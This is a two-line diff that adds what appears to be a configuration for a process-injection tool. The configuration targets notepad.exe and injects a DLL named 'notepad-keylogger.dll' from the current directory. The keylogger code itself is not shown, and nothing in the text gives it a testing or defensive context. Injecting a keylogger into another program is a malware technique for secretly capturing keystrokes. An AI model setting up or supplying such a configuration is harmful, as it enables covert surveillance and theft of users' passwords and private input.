@@ -1,0 +1,2 @@
+process-name notepad.exe
+inject-dll currentdirectory:notepad-keylogger.dll
